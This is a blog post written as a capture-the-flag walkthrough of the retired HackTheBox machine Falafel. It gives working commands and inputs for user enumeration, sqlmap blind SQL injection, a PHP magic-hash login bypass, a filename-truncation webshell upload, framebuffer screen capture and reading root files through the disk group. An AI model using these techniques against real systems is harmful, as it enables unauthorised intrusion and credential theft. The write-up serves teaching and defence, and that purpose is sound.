---
layout: post
title: "Every Password At Once"
subtitle: "HTB Falafel — a magic hash that equals any number, a screenshot stolen from the framebuffer, and root read straight off the disk"
date: 2018-06-30 12:00:00 +0000
description: "Falafel is a clinic in PHP's worst habit: a password hash that starts 0e equals every number you throw at it. Bluff your way to admin, truncate a filename into a webshell, photograph the screen through /dev/fb0, then read root off the raw disk because a group said you could."
image: /assets/og/every-password-at-once.png
tags: [hackthebox, php, type-juggling, linux, privesc, writeup]
---

Falafel is the rare box that teaches you something true about the language it's written in. PHP has a habit — a default, not a bug, which is the worst kind — of looking at two things that obviously aren't equal and deciding they're close enough. Falafel takes that habit and walks it all the way to root: a password that is secretly every password, a filename that lies about its own length, a screen you can photograph without a camera, and a disk that answers to a group instead of a user.

```
        F A L A F E L
        =============
        "0e462096..."  ==  4     ?
                        ==  9001  ?
                        ==  any number you want ?
                            |
                   php:  "sure. they're both zero." 
                            |
                            v
        one hash. infinite passwords.
        the login never had a chance.
                                            零
```

## 0x01 · the menu and the leak

`nmap` is polite about it: SSH on 22, Apache on 80, and a `robots.txt` that points a flashlight at exactly what it's hiding.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-robots.txt: 1 disallowed entry  /*.txt
```

So we `gobuster` for `.txt`, `.php`, `.html`, and the disallowed `.txt` rule pays out a confession file, `cyberlaw.txt`:

```
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!

A user named "chris" has informed me that he could log into MY account
without knowing the password, then take FULL CONTROL of the website
using the image upload feature.
```

That email is the entire box, spoiled by its own author. A user named **chris**. Login bypass *without the password*. Code exec through *image upload*. The walkthrough is written on the wall; we just have to do the crimes.

## 0x02 · who's real

The login form has a tell. Wrong username and password says *"try again."* Wrong password with a real username says *"Wrong identification: admin."* That difference is an oracle — the app is leaking which names exist before it ever checks a password. `wfuzz` a name list, filter out the 7074-char "try again" response, and two names light up:

```
# wfuzz -c -w names.txt -d "username=FUZZ&password=abcd" \
    -u http://10.10.10.73/login.php --hh 7074
000086:  C=200  ... "admin"
001883:  C=200  ... "chris"
```

`admin` and `chris`, confirmed. Exactly the two the confession named.

## 0x03 · twenty questions with the database

That same "does this user exist" oracle is a blind SQL injection waiting to happen. The app runs a query on the username before it checks the password, and tells us — true or false — whether rows came back. That's all a blind injection needs: a yes/no channel. `sqlmap`, pointed at the username field with `--string "Wrong identification"` as the marker for *true*:

```
# sqlmap -r login-chris.request --level 5 --risk 3 --batch \
    --string "Wrong identification" --dump
Parameter: username (POST)
    Type: boolean-based blind
    Payload: username=chris' AND 8059=8059-- GlxT&password=chris
```

Twenty-questions the database one character at a time, and the `users` table falls out:

```
+----+--------+----------+------------------------------------+
| ID | role   | username | password (md5)                     |
+----+--------+----------+------------------------------------+
| 1  | admin  | admin    | 0e462096931906507119562988736854   |
| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8   |  (juggling)
+----+--------+----------+------------------------------------+
```

chris's hash cracks to `juggling`. Subtle. The box is screaming the next move at you. But look harder at admin's hash — it starts with `0e` and everything after it is a digit. That is not a coincidence. That is the box loading the gun.

## 0x04 · the password that equals every number

Here's PHP's original sin. When you compare a string to a number with `==`, PHP converts the string to a number first. A string like `"0e462096..."` gets read as **scientific notation**: zero times ten to the power of *whatever*. Zero to any power is zero. So:

```php
php > var_dump("0e462096931906507119562988736854" == 0);   // true
php > var_dump("0e462096931906507119562988736854" == "0e999");  // true — both are 0
```

If the login code does a loose `==` between the stored hash and the hash of what you typed, then **any input whose md5 also starts with `0e<digits>` will match.** Picture a bouncer who "checks" IDs by reading only the first character. Your hash starts with a `0`, the admin's starts with a `0`, so as far as this bouncer is concerned you're the same person. PHP isn't comparing the passwords — it's comparing two numbers it made up, and it decided both were zero. These are "magic hashes," and they're pre-computed. The classic md5 magic string is `240610708`. Type that as the password and PHP declares your `0e8...` hash equal to admin's `0e4...` hash, because to PHP they're both just zero:

```
username: admin
password: 240610708    →    logged in as admin
```

We never knew the password. We handed PHP two different hashes and it agreed they were the same number. One hash, every password at once.

## 0x05 · a filename too long to stay a picture

Admin unlocks `/upload.php`, which fetches an image from a URL you give it — and blocks anything not ending in an image extension. The admin's profile page even leaves a hint about *length*. The server has a filename limit, and when you exceed it, it doesn't reject the file — it **truncates** it and tells you the new name:

```
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAA...AAA.php.    ← the .png got cut off the end
```

There's the whole trick. Name the upload `AAAA…AAA.php.png` — long enough that the filter sees a valid `.png`, but just long enough that the truncation lops off the last four characters and the file lands as `.php`. The validator and the filesystem disagree about what the filename is, and we live in the gap:

```
# curl 'http://10.10.10.73/uploads/0515-1930_.../AAAA...AAA.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Webshell. Trade it up for a real reverse shell and we're `www-data`.

## 0x06 · the password reuse parade

From here Falafel becomes a relay race of reused passwords. `connection.php` has the database creds in plaintext:

```php
define('DB_USERNAME', 'moshe');
define('DB_PASSWORD', 'falafelIsReallyTasty');
```

And of course moshe reused his DB password as his login password:

```
www-data@falafel:~$ su moshe   →   falafelIsReallyTasty   →   user.txt
```

## 0x07 · photographing a screen with no camera

moshe → yossi is the move people remember. moshe is a member of the `video` group, and `video` owns `/dev/fb0` — the **framebuffer**, the raw memory behind whatever is drawn on the physical console. You can `cat` the screen:

```
moshe@falafel:~$ cat /dev/fb0 > screenshot.raw
moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```

That `.raw` is a literal photograph of the server's monitor — no encoding, just pixels. Pull it back, open it in GIMP as raw image data at `1176x885`, flip through colour formats until `RGB565` snaps into focus, and you're looking at yossi's login session. His password is sitting on the screen:

```
yossi's password:  MoshePlzStopHackingMe!
```

The box knows what you did. It left a note about it on the very screen you stole.

## 0x08 · root, by group membership

yossi → root needs no exploit at all, just a wildly over-privileged group. `id` shows yossi in `disk`, and the `disk` group can read the raw block devices directly:

```
yossi@falafel:~$ groups
yossi adm disk cdrom dip plugdev lpadmin sambashare
```

If you can read `/dev/sda1`, file permissions on the filesystem are a polite fiction — you're underneath them. Think of file permissions as locks on individual drawers. Being in the `disk` group is holding a key to the steel wall the drawers are bolted into — you cut through the back, and the drawer locks never mattered. `debugfs` opens the raw disk and walks it as if you were root:

```
yossi@falafel:~$ debugfs /dev/sda1
debugfs:  cat /root/root.txt
████████████████████████████████
```

No privilege was escalated. The `disk` group *was* the privilege. root.txt was readable the whole time; yossi just had to be told he could open the drawer it lived in.

## 0x09 · the honest caveat

Falafel is four exploits, and the same sentence underneath all four: **somebody trusted a thing to mean what it looked like it meant.** PHP trusted that `==` compared values when it really compared vibes. The upload filter trusted that the filename it validated was the filename that got saved. moshe trusted one password to three jobs. The `video` and `disk` groups trusted that "can read a device" was a smaller permission than "can read root's files," when on Linux those are the same sentence.

The fix for the magic-hash bug is one extra character — `===` instead of `==`, identity instead of equality — and it has been one character the entire time. That's what makes type juggling such a good teacher. It isn't an exotic memory-corruption chain you need a debugger to feel. It's a default that does the convenient thing instead of the correct thing, on millions of live sites, and the only defense is a developer who knows the language well enough to distrust it. Frameworks have mostly killed it. "Mostly" is doing a lot of work in that sentence.

## 0x0a · outro

```
a hash that was secretly every number.
a filename too long to keep its disguise.
a screenshot with no camera.
a flag that a group had been handing out for free.

four bugs, one confession: everything trusted the costume.
the box even left the password on the screen, like a dare.

use ===, not ==. read the device, own the drawer. wear black.

                                                            EOF
```

---

*HTB: Falafel — retired 23 Jun 2018. a hard box that's really four lessons in misplaced trust, stacked. the magic hash still works anywhere a dev wrote `==` and went home.*
